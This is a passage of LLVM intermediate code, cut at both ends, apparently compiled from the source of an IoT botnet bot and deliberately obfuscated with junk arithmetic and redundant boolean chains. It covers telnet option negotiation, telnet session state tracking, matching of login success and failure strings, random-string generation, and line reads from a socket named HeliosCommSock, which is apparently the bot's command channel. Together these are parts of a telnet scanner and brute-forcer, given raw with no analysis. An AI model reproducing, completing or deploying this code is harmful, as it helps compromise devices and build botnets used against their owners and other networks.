  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %121

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 false, %40
  %42 = xor i1 false, true
  %43 = and i1 %39, %42
  %44 = xor i1 true, true
  %45 = and i1 %44, false
  %46 = and i1 true, %42
  %47 = or i1 %41, %43
  %48 = or i1 %45, %46
  %49 = xor i1 %47, %48
  %50 = xor i1 %39, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %121

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 false, %64
  %66 = xor i1 false, true
  %67 = and i1 %63, %66
  %68 = xor i1 true, true
  %69 = and i1 %68, false
  %70 = and i1 true, %66
  %71 = or i1 %65, %67
  %72 = or i1 %69, %70
  %73 = xor i1 %71, %72
  %74 = xor i1 %63, true
  br label %75

; <label>:75:                                     ; preds = %57, %52
  %76 = phi i1 [ false, %52 ], [ %73, %57 ]
  %77 = xor i1 %76, true
  %78 = and i1 false, %77
  %79 = xor i1 false, true
  %80 = and i1 %76, %79
  %81 = xor i1 true, true
  %82 = and i1 %81, false
  %83 = and i1 true, %79
  %84 = or i1 %78, %80
  %85 = or i1 %82, %83
  %86 = xor i1 %84, %85
  %87 = xor i1 %76, true
  %88 = zext i1 %86 to i32
  store i32 %88, i32* %3, align 4
  br label %121

; <label>:89:                                     ; preds = %2
  %90 = load i8*, i8** %4, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 @toupper(i32 %92) #10
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = call i32 @toupper(i32 %96) #10
  %98 = icmp eq i32 %93, %97
  br i1 %98, label %99, label %112

; <label>:99:                                     ; preds = %89
  %100 = load i8*, i8** %4, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 1
  %102 = load i8*, i8** %5, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i32 @wildString(i8* %101, i8* %103)
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = and i1 true, %106
  %108 = xor i1 true, true
  %109 = and i1 %105, %108
  %110 = or i1 %107, %109
  %111 = xor i1 %105, true
  br label %112

; <label>:112:                                    ; preds = %99, %89
  %113 = phi i1 [ false, %89 ], [ %110, %99 ]
  %114 = xor i1 %113, true
  %115 = and i1 true, %114
  %116 = xor i1 true, true
  %117 = and i1 %113, %116
  %118 = or i1 %115, %117
  %119 = xor i1 %113, true
  %120 = zext i1 %118 to i32
  store i32 %120, i32* %3, align 4
  br label %121

; <label>:121:                                    ; preds = %112, %75, %38, %9
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %28

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 %12, 1017029571
  %14 = add i32 %13, 65
  %15 = add i32 %14, 1017029571
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 %23, -32701664
  %25 = add i32 %24, 1
  %26 = add i32 %25, -32701664
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %5, align 4
  br label %6

; <label>:28:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -5088688980623215514, -1
  %47 = and i64 %44, -5088688980623215514
  %48 = and i64 %43, %46
  %49 = and i64 %45, -5088688980623215514
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -5088688980623215514, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 0, %60
  %62 = sub i32 0, 1
  %63 = add i32 %61, %62
  %64 = sub i32 0, %63
  %65 = add nsw i32 %60, 1
  %66 = call i32 @select(i32 %64, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %66, i32* %12, align 4
  %67 = icmp sle i32 %66, 0
  br i1 %67, label %68, label %113

; <label>:68:                                     ; preds = %33
  br label %69

; <label>:69:                                     ; preds = %106, %68
  %70 = load i32, i32* %13, align 4
  %71 = icmp slt i32 %70, 10
  br i1 %71, label %72, label %112

; <label>:72:                                     ; preds = %69
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %73, align 8
  %74 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %74, align 8
  br label %75

; <label>:75:                                     ; preds = %72
  %76 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %77 = getelementptr inbounds [16 x i64], [16 x i64]* %76, i64 0, i64 0
  %78 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %77) #2, !srcloc !2
  %79 = extractvalue { i64, i64* } %78, 0
  %80 = extractvalue { i64, i64* } %78, 1
  %81 = trunc i64 %79 to i32
  store i32 %81, i32* %14, align 4
  %82 = ptrtoint i64* %80 to i64
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %15, align 4
  br label %84

; <label>:84:                                     ; preds = %75
  %85 = load i32, i32* %5, align 4
  %86 = srem i32 %85, 64
  %87 = zext i32 %86 to i64
  %88 = shl i64 1, %87
  %89 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %90 = load i32, i32* %5, align 4
  %91 = sdiv i32 %90, 64
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = and i64 %94, %88
  %96 = xor i64 %94, %88
  %97 = or i64 %95, %96
  %98 = or i64 %94, %88
  store i64 %97, i64* %93, align 8
  %99 = load i32, i32* %5, align 4
  %100 = add i32 %99, 238212597
  %101 = add i32 %100, 1
  %102 = sub i32 %101, 238212597
  %103 = add nsw i32 %99, 1
  %104 = call i32 @select(i32 %102, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %104, i32* %12, align 4
  %105 = icmp sle i32 %104, 0
  br i1 %105, label %106, label %111

; <label>:106:                                    ; preds = %84
  %107 = load i32, i32* %13, align 4
  %108 = sub i32 0, 1
  %109 = sub i32 %107, %108
  %110 = add nsw i32 %107, 1
  store i32 %109, i32* %13, align 4
  br label %69

; <label>:111:                                    ; preds = %84
  br label %112

; <label>:112:                                    ; preds = %111, %69
  br label %113

; <label>:113:                                    ; preds = %112, %33
  store i32 0, i32* %18, align 4
  %114 = load i8*, i8** %6, align 8
  store i8* %114, i8** %17, align 8
  br label %115

; <label>:115:                                    ; preds = %135, %113
  %116 = load i32, i32* %7, align 4
  %117 = sub i32 0, -1
  %118 = sub i32 %116, %117
  %119 = add nsw i32 %116, -1
  store i32 %118, i32* %7, align 4
  %120 = icmp sgt i32 %116, 1
  br i1 %120, label %121, label %141

; <label>:121:                                    ; preds = %115
  %122 = load i32, i32* @HeliosCommSock, align 4
  %123 = call i64 @recv(i32 %122, i8* %16, i64 1, i32 0)
  %124 = icmp ne i64 %123, 1
  br i1 %124, label %125, label %127

; <label>:125:                                    ; preds = %121
  %126 = load i8*, i8** %17, align 8
  store i8 0, i8* %126, align 1
  store i32 -1, i32* %4, align 4
  br label %144

; <label>:127:                                    ; preds = %121
  %128 = load i8, i8* %16, align 1
  %129 = load i8*, i8** %17, align 8
  %130 = getelementptr inbounds i8, i8* %129, i32 1
  store i8* %130, i8** %17, align 8
  store i8 %128, i8* %129, align 1
  %131 = load i8, i8* %16, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 10
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %127
  br label %141

; <label>:135:                                    ; preds = %127
  %136 = load i32, i32* %18, align 4
  %137 = sub i32 %136, -580626111
  %138 = add i32 %137, 1
  %139 = add i32 %138, -580626111
  %140 = add nsw i32 %136, 1
  store i32 %139, i32* %18, align 4
  br label %115

; <label>:141:                                    ; preds = %134, %115
  %142 = load i8*, i8** %17, align 8
  store i8 0, i8* %142, align 1
  %143 = load i32, i32* %18, align 4
  store i32 %143, i32* %4, align 4
  br label %144

; <label>:144:                                    ; preds = %141, %125
  %145 = load i32, i32* %4, align 4
  ret i32 %145
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = and i64 %37, %31
  %39 = xor i64 %37, %31
  %40 = or i64 %38, %39
  %41 = or i64 %37, %31
  store i64 %40, i64* %36, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sub i32 %42, 1278270043
  %44 = add i32 %43, 1
  %45 = add i32 %44, 1278270043
  %46 = add nsw i32 %42, 1
  %47 = call i32 @select(i32 %45, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %48 = icmp slt i32 %47, 1
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %57

; <label>:50:                                     ; preds = %27
  %51 = load i32, i32* %6, align 4
  %52 = load i8*, i8** %8, align 8
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = call i64 @recv(i32 %51, i8* %52, i64 %54, i32 0)
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %5, align 4
  br label %57

; <label>:57:                                     ; preds = %50, %49
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %19, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 %10, -2126172411
  %12 = add i32 %11, 1
  %13 = add i32 %12, -2126172411
  %14 = add nsw i32 %10, 1
  store i32 %13, i32* %6, align 4
  %15 = sext i32 %13 to i64
  %16 = getelementptr inbounds i8*, i8** %9, i64 %15
  %17 = load i8*, i8** %16, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %8
  br label %8

; <label>:20:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %36, %20
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %43

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %4, align 8
  %27 = load i8**, i8*** %5, align 8
  %28 = load i32, i32* %7, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8*, i8** %27, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %26, i8* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %25
  store i32 1, i32* %3, align 4
  br label %44

; <label>:35:                                     ; preds = %25
  br label %36

; <label>:36:                                     ; preds = %35
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 0, %37
  %39 = sub i32 0, 1
  %40 = add i32 %38, %39
  %41 = sub i32 0, %40
  %42 = add nsw i32 %37, 1
  store i32 %41, i32* %7, align 4
  br label %21

; <label>:43:                                     ; preds = %21
  store i32 0, i32* %3, align 4
  br label %44

; <label>:44:                                     ; preds = %43, %34
  %45 = load i32, i32* %3, align 4
  ret i32 %45
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
